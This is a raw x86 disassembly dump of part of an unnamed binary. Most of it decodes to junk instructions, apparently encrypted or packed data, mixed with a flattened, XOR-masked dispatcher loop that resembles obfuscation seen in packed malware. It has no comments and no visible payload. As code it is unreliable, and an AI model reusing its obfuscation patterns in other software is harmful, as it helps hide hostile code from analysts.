  40ebc1:	stos   BYTE PTR es:[edi],al
  40ebc2:	fild   DWORD PTR [esi+0x21]
  40ebc5:	or     ch,bh
  40ebc7:	jle    0x40ec33
  40ebc9:	dec    ecx
  40ebca:	sub    BYTE PTR [ecx-0x562ced77],ah
  40ebd0:	dec    ebx
  40ebd1:	pop    esi
  40ebd2:	lods   al,BYTE PTR ds:[esi]
  40ebd3:	ds pop esp
  40ebd5:	pop    edi
  40ebd6:	cmp    eax,0x959f2d98
  40ebdb:	mov    es,WORD PTR [edx-0x77]
  40ebde:	not    DWORD PTR [edi-0x5]
  40ebe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe2:	jle    0x40ebf8
  40ebe4:	mov    edx,0x451cc505
  40ebe9:	arpl   WORD PTR fs:[ebp+0x3d],si
  40ebed:	jb     0x40ebc2
  40ebef:	cwde   
  40ebf0:	sahf   
  40ebf1:	std    
  40ebf2:	or     ecx,edi
  40ebf4:	adc    edx,DWORD PTR [esi+0x13]
  40ebf7:	cmp    ebp,ecx
  40ebf9:	out    dx,al
  40ebfa:	ds jno 0x40eba4
  40ebfd:	adc    esi,esp
  40ebff:	inc    eax
  40ec00:	add    DWORD PTR [edi],edi
  40ec02:	cmp    al,0x4
  40ec04:	cli    
  40ec05:	jmp    0x40ebac
  40ec07:	scas   al,BYTE PTR es:[edi]
  40ec08:	jnp    0x40ec66
  40ec0a:	adc    BYTE PTR [ecx-0x46],bh
  40ec0d:	or     eax,DWORD PTR [edi+ebp*8]
  40ec10:	and    DWORD PTR [edi*1+0x724fe0e9],ecx
  40ec17:	jmp    0x40ebaf
  40ec19:	(bad)  
  40ec1a:	arpl   WORD PTR [ebp-0x5e],bx
  40ec1d:	imul   BYTE PTR [ebp-0x63]
  40ec20:	je     0x40ec41
  40ec22:	addr16 jb 0x40ebfa
  40ec25:	inc    esi
  40ec26:	repnz xor eax,0xd0e9b4f5
  40ec2c:	or     al,0x3a
  40ec2e:	sbb    BYTE PTR [eax],dl
  40ec30:	push   esp
  40ec31:	stc    
  40ec32:	scas   eax,DWORD PTR es:[edi]
  40ec33:	outs   dx,BYTE PTR ds:[esi]
  40ec34:	jno    0x40ec0d
  40ec36:	dec    BYTE PTR [ebp-0x1e]
  40ec39:	out    dx,eax
  40ec3a:	pop    es
  40ec3b:	outs   dx,BYTE PTR ds:[esi]
  40ec3c:	push   ecx
  40ec3d:	mov    ebp,0x9637d460
  40ec42:	nop
  40ec43:	iret   
  40ec44:	xor    ah,BYTE PTR [edi+ebp*2+0x3e26b42f]
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ebp+ecx*1-0x85ee19],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	pop    ebp
  40eccd:	fnsave [edx]
  40eccf:	cmp    eax,0xb82d3069
  40ecd4:	xchg   esi,eax
  40ecd5:	mov    ecx,0x982ce6ba
  40ecda:	and    al,BYTE PTR [edi]
  40ecdc:	inc    DWORD PTR [edi-0x664f5f1c]
  40ece2:	pop    ebp
  40ece3:	cmp    BYTE PTR [edx+0x73b7ef7f],bh
  40ece9:	adc    DWORD PTR [esi],0x81a83b40
  40ecef:	out    dx,eax
  40ecf0:	in     eax,dx
  40ecf1:	xchg   esp,eax
  40ecf2:	cmp    dl,BYTE PTR ds:0x52fc85b2
  40ecf8:	sub    eax,0x55014093
  40ecfd:	and    dl,BYTE PTR [esi]
  40ecff:	and    DWORD PTR [ebx+0x7f5efd11],esi
  40ed05:	mov    bl,BYTE PTR [esi+0xb]
  40ed08:	or     eax,0xf2195776
  40ed0d:	into   
  40ed0e:	int    0xec
  40ed10:	lds    ebx,FWORD PTR [ecx]
  40ed12:	jno    0x40ed0b
  40ed14:	shl    BYTE PTR [ebp-0x46],cl
  40ed17:	sub    al,0xc5
  40ed19:	out    0xba,eax
  40ed1b:	push   ss
  40ed1c:	sar    dl,1
  40ed1e:	and    ch,BYTE PTR [eax-0x5e74a868]
  40ed24:	jecxz  0x40ed7d
  40ed26:	(bad)  
  40ed28:	jmp    0x7870:0x710c1817
  40ed2f:	mov    al,ds:0x893ac8d
  40ed34:	mov    ds:0x18039670,eax
  40ed39:	cld    
  40ed3a:	les    edi,FWORD PTR [esi+eiz*8]
  40ed3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed3e:	mov    al,ch
  40ed40:	adc    eax,0xc99ffd3b
  40ed45:	mov    edi,eax
  40ed47:	mov    fs,ebx
  40ed49:	in     eax,dx
  40ed4a:	mov    al,0x6e
  40ed4c:	aam    0x81
  40ed4e:	scas   al,BYTE PTR es:[edi]
  40ed4f:	arpl   WORD PTR [ebx],di
  40ed51:	dec    eax
  40ed52:	leave  
  40ed53:	jnp    0x40ed65
  40ed55:	xor    eax,DWORD PTR [ebx-0x5]
  40ed58:	jecxz  0x40ece1
  40ed5a:	(bad)  
  40ed5b:	call   FWORD PTR [ecx+0x611d4ac7]
  40ed61:	ficom  DWORD PTR [ebx+0x1cf02450]
  40ed67:	add    BYTE PTR [eax],ah
  40ed69:	popf   
  40ed6a:	jns    0x40ecfb
  40ed6c:	push   edx
  40ed6d:	out    0xc8,eax
  40ed6f:	repz dec esi
  40ed71:	dec    esi
  40ed72:	ficom  DWORD PTR [edx]
  40ed74:	sub    al,0xad
  40ed76:	cmc    
  40ed77:	mov    esp,DWORD PTR [esp+eiz*8+0x36]
  40ed7b:	push   esi
  40ed7c:	pusha  
  40ed7d:	fimul  WORD PTR [ecx+0x56b8e08c]
  40ed83:	and    esp,DWORD PTR [edi]
  40ed85:	xchg   ecx,eax
  40ed86:	or     BYTE PTR [eax],0x16
  40ed89:	and    esp,DWORD PTR [edi+0x8]
  40ed8c:	in     eax,dx
  40ed8d:	outs   dx,DWORD PTR ds:[esi]
  40ed8e:	inc    esi
  40ed8f:	jmp    FWORD PTR [ecx]
  40ed91:	scas   al,BYTE PTR es:[edi]
  40ed92:	jmp    DWORD PTR [esi]
  40ed94:	add    eax,0x198627a3
  40ed99:	rcr    ch,cl
  40ed9b:	mov    al,0x32
  40ed9d:	rcr    BYTE PTR [edx-0x47],cl
  40eda0:	cmp    dh,BYTE PTR [eax]
  40eda2:	lea    esp,[ebx+0x27]
  40eda5:	mov    eax,ds:0x1e197ffe
  40edaa:	and    ch,BYTE PTR [esi-0x7b]
  40edad:	xchg   ebp,eax
  40edae:	sbb    eax,0xa7ead26d
  40edb3:	adc    al,0x0
  40edb5:	in     al,dx
  40edb6:	loopne 0x40edfb
  40edb8:	popf   
  40edb9:	mov    bh,0x96
  40edbb:	not    eax
  40edbd:	test   eax,0x84035d0d
  40edc2:	xchg   edx,eax
  40edc3:	sub    eax,ebp
  40edc5:	sti    
  40edc6:	shl    DWORD PTR [ecx],0x79
  40edc9:	jae    0x40ee1d
  40edcb:	ja     0x40edfd
  40edcd:	retf   
  40edce:	fsubr  QWORD PTR [edi+0x22]
  40edd1:	jge    0x40ed99
  40edd3:	sar    DWORD PTR [ecx],0x68
  40edd6:	sub    ebx,DWORD PTR [edx+0x79]
  40edd9:	int3   
  40edda:	or     ebp,DWORD PTR [eax-0x6c]
  40eddd:	push   ecx
  40edde:	mov    ah,0x9
  40ede0:	jb     0x40edf0
  40ede2:	xor    bh,bh
  40ede4:	out    dx,eax
  40ede5:	cdq    
  40ede6:	sub    al,0xb6
  40ede8:	(bad)  
  40ede9:	popf   
  40edea:	cmp    esp,DWORD PTR [ecx+0x8]
  40eded:	in     al,dx
  40edee:	sub    al,0x9b
  40edf0:	stc    
  40edf1:	mov    ah,0x55
  40edf3:	xchg   edx,eax
  40edf4:	pop    edx
  40edf5:	xchg   edx,eax
  40edf6:	fmul   QWORD PTR [edx+0x32e5ed1b]
  40edfc:	push   esi
  40edfd:	test   BYTE PTR [ebp+0x5e],cl
  40ee00:	push   es
  40ee01:	outs   dx,BYTE PTR ds:[esi]
  40ee02:	sti    
  40ee03:	inc    ebp
  40ee04:	pop    edi
  40ee05:	xor    edx,ecx
  40ee07:	mov    ah,0x6a
  40ee09:	inc    edx
  40ee0a:	or     BYTE PTR [edi+0x2],ah
  40ee0d:	mov    eax,ds:0xa98db241
  40ee12:	push   es
  40ee13:	add    ch,BYTE PTR [eax]
  40ee15:	addr16 ret 
  40ee17:	mov    al,0x3b
  40ee19:	xchg   edi,eax
  40ee1a:	xchg   esp,eax
  40ee1b:	lahf   
  40ee1c:	jae    0x40ee93
  40ee1e:	mov    edi,DWORD PTR [edx]
  40ee20:	jle    0x40ee28
  40ee22:	mov    ds:0x31da1f1a,eax
  40ee27:	js     0x40edcf
  40ee29:	cdq    
  40ee2a:	scas   eax,DWORD PTR es:[edi]
  40ee2b:	push   esi
  40ee2c:	xor    eax,0xdbbc312a
  40ee31:	test   al,0xe7
  40ee33:	inc    esp
  40ee34:	and    cl,bh
  40ee36:	out    dx,al
  40ee37:	repnz mov al,ds:0xd45ddc5a
  40ee3d:	push   eax
  40ee3e:	cmp    al,0x5
  40ee40:	loopne 0x40edf0
  40ee42:	fimul  DWORD PTR [ecx]
  40ee44:	arpl   WORD PTR [eax],dx
  40ee46:	xor    BYTE PTR [ebx+0xd],dh
  40ee49:	xchg   ebx,eax
  40ee4a:	test   eax,0xc121bf69
  40ee4f:	adc    dh,BYTE PTR [ebp-0x77]
  40ee52:	int3   
  40ee53:	in     eax,dx
  40ee54:	das    
  40ee55:	add    eax,0xcb81d9ab
  40ee5a:	lods   al,BYTE PTR ds:[esi]
  40ee5b:	cmp    esi,DWORD PTR [edx+esi*1-0x7163bfe4]
  40ee62:	push   ss
  40ee63:	add    ecx,esi
  40ee65:	inc    esp
  40ee66:	shufps xmm2,XMMWORD PTR [ebp+0x1e],0x66
  40ee6b:	xchg   edi,eax
  40ee6d:	ret    0x80da
  40ee70:	mov    edi,0x7365001f
  40ee75:	xor    DWORD PTR [edx],edx
  40ee77:	xor    eax,0x25b4c8cc
  40ee7c:	enter  0x23b8,0xc3
  40ee80:	adc    ebp,DWORD PTR [esp+edi*1+0x2b]
  40ee84:	ret    
  40ee85:	push   esp
  40ee86:	cmp    al,0x6
  40ee88:	push   ecx
  40ee89:	pop    esi
  40ee8a:	mov    eax,ds:0x258eab53
  40ee8f:	ds stos DWORD PTR es:[edi],eax
  40ee91:	imul   ecx,DWORD PTR [ebx],0x26
  40ee94:	dec    ebp
  40ee95:	lea    ebp,[edi-0x6]
  40ee98:	push   0xffffffb5
  40ee9a:	in     eax,dx
  40ee9b:	and    al,0x9f
  40ee9d:	and    edx,0xfffffff4
  40eea0:	add    BYTE PTR [ebp-0x66711aa6],bh
  40eea6:	sub    ah,BYTE PTR [edx]
  40eea8:	xor    al,0xfb
  40eeaa:	aaa    
  40eeab:	(bad)  
  40eead:	shr    DWORD PTR [edi],cl
  40eeaf:	mov    DWORD PTR [eax],ebx
  40eeb1:	clc    
  40eeb2:	sub    DWORD PTR [esi-0x57],0x73684ec2
  40eeb9:	xor    eax,0x56213426
  40eebe:	in     eax,dx
  40eebf:	xchg   esp,eax
  40eec0:	cmp    al,0x2f
  40eec2:	or     al,0xec
  40eec4:	int    0xb5
  40eec6:	lahf   
  40eec7:	pop    eax
  40eec8:	xor    dh,BYTE PTR [edx+0x4a]
  40eecb:	cmp    BYTE PTR [edx-0x7b],dh
  40eece:	push   ebx
  40eecf:	push   es
  40eed0:	jbe    0x40ee62
  40eed2:	sbb    DWORD PTR [edx+0x2c],esp
  40eed5:	out    0xaa,eax
  40eed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eed8:	xor    ah,BYTE PTR [eax-0x6217fab5]
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x7f98ef46],0x8ff4396c
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef60
  40ef11:	adc    BYTE PTR [edx+edi*8-0x7d],cl
  40ef15:	aad    0xf5
  40ef17:	test   al,0x46
  40ef19:	push   edi
  40ef1a:	pushf  
  40ef1b:	add    BYTE PTR [eax],cl
  40ef1d:	or     BYTE PTR [ebx],0xae
  40ef20:	loope  0x40ef00
  40ef22:	gs lahf 
  40ef24:	jns    0x40ef7a
  40ef26:	push   esp
  40ef27:	in     eax,0x80
  40ef29:	and    BYTE PTR [ebp+0xf8f959e],bl
  40ef2f:	sub    eax,0x19453159
  40ef34:	add    al,0x9f
  40ef36:	inc    ebp
  40ef37:	in     eax,dx
  40ef38:	dec    ebp
  40ef39:	push   0x595d8e08
  40ef3e:	jno    0x40ef81
  40ef40:	test   eax,0xaf874180
  40ef45:	cmp    al,0xf4
  40ef47:	mov    ah,0x46
  40ef49:	mov    eax,ds:0xa04a3879
  40ef4e:	sub    ebx,edi
  40ef50:	dec    esi
  40ef51:	fldenv [esi+0x75]
  40ef54:	sbb    ebx,ecx
  40ef56:	adc    DWORD PTR ds:0x607b1a2c,esp
  40ef5c:	or     ebx,DWORD PTR [ecx-0x76a8f216]
  40ef62:	idiv   DWORD PTR [edx+0x1d]
  40ef65:	xor    eax,0x1752df69
  40ef6a:	xchg   ebp,eax
  40ef6b:	(bad)  
  40ef6c:	test   DWORD PTR [ebp-0x2c9dcf39],0xbc085c5
  40ef76:	adc    eax,0xcb004851
  40ef7b:	inc    esi
  40ef7c:	sbb    eax,0x17
  40ef7f:	icebp  
  40ef80:	ror    dh,0xa9
  40ef83:	mov    ecx,0xf7cade9e
  40ef88:	fidiv  WORD PTR ds:0xeff18e50
  40ef8e:	and    BYTE PTR [eax],0x2d
  40ef91:	aam    0x75
  40ef93:	sbb    DWORD PTR [eax+eiz*2-0x50ae89aa],edi
  40ef9a:	imul   esp,DWORD PTR [esi],0xc483772
  40efa0:	jo     0x40ef89
  40efa2:	pop    ebx
  40efa3:	xchg   ecx,eax
  40efa4:	mov    dh,0xb
  40efa6:	dec    ecx
  40efa7:	(bad)  
  40efa9:	jae    0x40ef74
  40efab:	fwait
  40efac:	dec    ebx
  40efad:	ja     0x40ef79
  40efaf:	int3   
  40efb0:	mov    ecx,0x5f2ea100
  40efb5:	fs xor al,0xd5
  40efb8:	in     al,dx
  40efb9:	pusha  
  40efba:	jle    0x40efb6
  40efbc:	fistp  WORD PTR [ecx]
  40efbe:	inc    esi
  40efbf:	inc    ecx
  40efc0:	in     al,dx
  40efc1:	or     bl,BYTE PTR [edi]
  40efc3:	test   DWORD PTR [edi+0x6022c7ee],ecx
  40efc9:	mov    ebx,ebx
  40efcb:	scas   eax,DWORD PTR es:[edi]
  40efcc:	(bad)  
  40efcd:	jp     0x40ef87
  40efcf:	jo     0x40ef90
  40efd1:	ds retf 
  40efd3:	pusha  
  40efd4:	mov    fs,WORD PTR [esi-0x12d6d69c]
  40efda:	sub    di,WORD PTR [ecx]
  40efdd:	retf   0xe287
  40efe0:	sar    DWORD PTR [edx-0x35],1
  40efe3:	sti    
  40efe4:	mov    BYTE PTR [ebp+0x7a],dl
  40efe7:	sub    eax,0x91d98fa6
  40efec:	pop    esp
  40efed:	in     al,0x93
  40efef:	lock jb 0x40f070
  40eff2:	dec    eax
  40eff3:	fisub  DWORD PTR [esi+0x679b6563]
  40eff9:	nop
  40effa:	pop    ds
  40effb:	dec    edx
  40effc:	enter  0xd703,0x8e
  40f000:	xchg   ch,cl
  40f002:	ins    DWORD PTR es:[edi],dx
  40f003:	and    esp,DWORD PTR [edx+0x75]
  40f006:	daa    
  40f007:	add    edi,DWORD PTR [ebx]
  40f009:	cwde   
  40f00a:	sbb    al,0x6a
  40f00c:	pusha  
  40f00d:	int3   
  40f00e:	mov    BYTE PTR [esi-0x5074054b],bh
  40f014:	or     al,0x15
  40f016:	jge    0x40efad
  40f018:	ins    DWORD PTR es:[edi],dx
  40f019:	out    dx,eax
  40f01a:	inc    eax
  40f01b:	fwait
  40f01c:	push   cs
  40f01d:	dec    edi
  40f01e:	je     0x40f000
  40f020:	in     al,dx
  40f021:	std    
  40f022:	mov    ebx,DWORD PTR ds:0xe99e55b6
  40f028:	nop
  40f029:	pop    es
  40f02a:	shl    dl,1
  40f02c:	imul   edi,DWORD PTR [edi+0xa655c80],0x6d
  40f033:	gs (bad) 
  40f035:	rcr    DWORD PTR [ebp+0x3ca51345],1
  40f03b:	inc    ebp
  40f03c:	std    
  40f03d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03e:	int    0x49
  40f040:	out    0xec,eax
  40f042:	jg     0x40efe8
  40f044:	test   BYTE PTR [eax],cl
  40f046:	scas   al,BYTE PTR es:[edi]
  40f047:	mov    ebx,0x1f437d46
  40f04c:	inc    ebx
  40f04d:	mov    eax,ds:0xdc853ccd
  40f052:	aas    
  40f053:	into   
  40f054:	ds cmp eax,0xa02d905a
  40f05a:	ror    ecx,1
  40f05c:	dec    ebp
  40f05d:	aam    0x7e
  40f05f:	inc    esp
  40f060:	daa    
  40f061:	call   0xf3a0:0x21d3354a
  40f068:	ins    BYTE PTR es:[edi],dx
  40f069:	mov    dl,0x41
  40f06b:	out    0xc4,al
  40f06d:	add    dh,BYTE PTR [edi+ecx*2]
  40f070:	xchg   edx,eax
  40f071:	inc    ebx
  40f072:	dec    ecx
  40f073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f074:	jle    0x40f04f
  40f076:	idiv   BYTE PTR [edx]
  40f078:	xchg   esi,eax
  40f079:	xlat   BYTE PTR ds:[ebx]
  40f07a:	mov    ebx,DWORD PTR [ecx-0x7a36dd32]
  40f080:	mov    ebx,0xbdcdc622
  40f085:	xor    eax,0xe610e0b4
  40f08a:	mov    edx,edi
  40f08c:	test   dh,0xe
  40f08f:	jo     0x40f07e
  40f091:	ds push 0xffffffba
  40f094:	outs   dx,BYTE PTR ds:[si]
  40f096:	cmp    bl,ch
  40f098:	and    al,0x15
  40f09a:	cmp    al,0x22
  40f09c:	out    0xa8,al
  40f09e:	pop    eax
  40f09f:	rcl    DWORD PTR [eax-0x75],cl
  40f0a2:	xchg   esi,eax
  40f0a3:	lods   al,BYTE PTR ds:[esi]
  40f0a4:	fs jo  0x40f05d
  40f0a7:	push   0x21
  40f0a9:	cmp    esp,DWORD PTR [ecx]
  40f0ab:	mov    bh,0xc9
  40f0ad:	fstp   TBYTE PTR [edi+0x21]
  40f0b0:	add    DWORD PTR [ecx+0x79163212],ebp
  40f0b6:	xchg   ecx,eax
  40f0b7:	out    0xfb,al
  40f0b9:	mov    eax,ds:0x7c8b36ca
  40f0be:	cmp    al,0x25
  40f0c0:	jg     0x40f132
  40f0c2:	or     ecx,DWORD PTR [ebx-0x23]
  40f0c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0c6:	mov    eax,ds:0xab87f97e
  40f0cb:	repnz xchg ecx,eax
  40f0cd:	popf   
  40f0ce:	fld    TBYTE PTR [ecx+esi*2+0x68]
  40f0d2:	add    eax,DWORD PTR [edx-0x60]
  40f0d5:	mov    ds:0xeec9a7a2,eax
  40f0da:	mov    cl,0xc6
  40f0dc:	call   0x21ba1d60
  40f0e1:	mov    ebx,0x98cde870
  40f0e6:	ds adc eax,0xcad0f556
  40f0ec:	fbstp  TBYTE PTR [ebx+0x62f238e5]
  40f0f2:	sub    eax,0x24890599
  40f0f7:	xchg   esi,eax
  40f0f8:	das    
  40f0f9:	rol    BYTE PTR [ebp+edx*4+0x55bed0e9],1
  40f100:	and    al,0x95
  40f102:	and    BYTE PTR [edi],ah
  40f104:	dec    edx
  40f105:	popf   
  40f106:	loope  0x40f0a0
  40f108:	ins    BYTE PTR es:[edi],dx
  40f109:	mov    edi,0xd91cbce1
  40f10e:	fwait
  40f10f:	ins    BYTE PTR es:[edi],dx
  40f110:	test   BYTE PTR [edx],bl
  40f112:	sbb    al,0x52
  40f114:	push   ecx
  40f115:	div    ebp
  40f117:	(bad)
  40f11a:	push   ds
  40f11b:	push   cs
  40f11c:	cli    
  40f11d:	jge    0x40f0fb
  40f11f:	nop
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x238f2d7c]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1ea
  40f1e9:	jl     0x40f170
  40f1eb:	push   ecx
  40f1ec:	sub    eax,0x1a29c98a
  40f1f1:	add    cl,dh
  40f1f3:	dec    ecx
  40f1f4:	inc    ebx
  40f1f5:	scas   al,BYTE PTR es:[edi]
  40f1f6:	dec    ebp
  40f1f7:	sar    eax,0x45
  40f1fa:	pop    ss
  40f1fb:	xor    DWORD PTR [edx-0xf],0x9c5266e6
  40f202:	ror    DWORD PTR [edx],cl
  40f204:	fisubr WORD PTR [ecx+eax*2]
  40f207:	pop    edx
  40f208:	cmp    ah,dl
  40f20a:	push   eax
  40f20b:	add    al,0xd7
  40f20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20e:	or     BYTE PTR [esi+0x5e4fe9c6],dl
  40f214:	pop    eax
  40f215:	sub    dh,BYTE PTR [ecx+0x25]
  40f218:	loop   0x40f24a
  40f21a:	pop    ebx
  40f21b:	test   eax,0xd57e2d4a
  40f220:	stos   BYTE PTR es:[edi],al
  40f221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f222:	out    0x57,eax
  40f224:	mov    dh,0x3b
  40f226:	popa   
  40f227:	jo     0x40f1e6
  40f229:	cmp    al,0x94
  40f22b:	mov    ds:0x4a2c5835,eax
  40f230:	add    ecx,DWORD PTR cs:[edi-0x2c5a17a3]
  40f237:	sahf   
  40f238:	stos   DWORD PTR es:[edi],eax
  40f239:	in     al,0xc4
  40f23b:	sub    eax,0xfc69dfa3
  40f240:	cld    
  40f241:	mov    eax,0x1ba23785
  40f246:	jbe    0x40f290
  40f248:	sbb    edx,DWORD PTR [edi-0x1f7cdae5]
  40f24e:	or     al,BYTE PTR [esi+edx*1-0x28e4a8ba]
  40f255:	or     cl,BYTE PTR [ebx+0x24f1de55]
  40f25b:	std    
  40f25c:	push   esp
  40f25d:	dec    ecx
  40f25e:	out    0x5a,eax
  40f260:	inc    ebx
  40f261:	push   esp
  40f262:	cdq    
  40f263:	xchg   esp,esi
  40f265:	outs   dx,DWORD PTR ds:[esi]
  40f266:	retf   
  40f267:	sbb    al,0xa9
  40f269:	adc    al,0xcc
  40f26b:	(bad)  
  40f26c:	jo     0x40f281
  40f26e:	xlat   BYTE PTR ds:[ebx]
  40f26f:	out    0x4c,eax
  40f271:	les    esp,FWORD PTR ds:0x35b8be56
  40f277:	inc    esi
  40f278:	push   ss
  40f279:	push   esi
  40f27a:	xchg   edx,eax
  40f27b:	sbb    bl,dl
  40f27d:	stos   DWORD PTR es:[edi],eax
  40f27e:	and    BYTE PTR [ebx],dh
  40f280:	idiv   BYTE PTR [ecx-0x63]
  40f283:	pop    esp
  40f284:	xor    eax,0x46ae9a38
  40f289:	add    al,0x4
  40f28b:	push   ds
  40f28c:	neg    BYTE PTR [edx-0xbea704b]
  40f292:	ss jle 0x40f250
  40f295:	fsubr  QWORD PTR [edi-0x4f]
  40f298:	mov    edx,DWORD PTR [edi]
  40f29a:	sub    DWORD PTR [eax+0x7e2a322e],ebx
  40f2a0:	fs cmc 
  40f2a2:	data16 fst QWORD PTR [ebp-0x5be0a607]
  40f2a9:	cmp    eax,0xaf876a25
  40f2ae:	cmp    ebp,ebp
  40f2b0:	push   esi
  40f2b1:	mov    ds:0x7564e53b,al
  40f2b6:	outs   dx,BYTE PTR ds:[esi]
  40f2b7:	push   esp
  40f2b8:	rcr    dl,cl
  40f2ba:	ret    0x8a00
  40f2bd:	cmp    esi,DWORD PTR [edx]
  40f2bf:	xor    ch,dh
  40f2c1:	or     eax,0x5821fa3f
  40f2c6:	cmp    edi,0x75
  40f2c9:	sub    edx,DWORD PTR [edx]
  40f2cb:	outs   dx,BYTE PTR ds:[esi]
  40f2cc:	retf   0xb6bb
  40f2cf:	sub    ebx,eax
  40f2d1:	in     al,dx
  40f2d2:	es sub al,al
  40f2d5:	push   eax
  40f2d6:	xchg   ecx,eax
  40f2d7:	xor    BYTE PTR [ebx-0x5f68c912],dl
  40f2dd:	push   ebp
  40f2de:	mov    ch,0x73
  40f2e1:	pop    ds
  40f2e2:	cmp    eax,0x32012f16
  40f2e7:	rol    BYTE PTR [esi+0x434f3086],0xff
  40f2ee:	ret    0xe332
  40f2f1:	popa   
  40f2f2:	jbe    0x40f307
  40f2f4:	and    BYTE PTR [ebp+0x56245f],ah
  40f2fa:	xchg   esi,eax
  40f2fb:	push   ebx
  40f2fd:	xchg   ebp,eax
  40f2fe:	sub    eax,0x7efa6765
  40f303:	xchg   al,al
  40f305:	loop   0x40f2a7
  40f307:	fsub   DWORD PTR [eax-0x481c8f61]
  40f30d:	lock aas 
  40f30f:	or     ebx,DWORD PTR [esi]
  40f311:	dec    ebp
  40f312:	mov    BYTE PTR [esi],dl
  40f314:	loope  0x40f384
  40f316:	pop    ebp
  40f317:	mov    esp,DWORD PTR [esi+0x65d8dc98]
  40f31d:	xor    DWORD PTR [edx+0x22],esi
  40f320:	mov    dh,0xe3
  40f322:	int3   
  40f323:	dec    esp
  40f324:	rcl    DWORD PTR [esi+eiz*2],0xd1
  40f328:	xchg   BYTE PTR [edi+edx*4-0x5c3e4c06],ah
  40f32f:	in     eax,0x29
  40f331:	ror    DWORD PTR [esi+0x6f],0x6
  40f335:	pop    eax
  40f336:	or     bl,dl
  40f338:	jg     0x40f369
  40f33a:	inc    esi
  40f33b:	mov    esp,DWORD PTR [edx+0x7d]
  40f33e:	sahf   
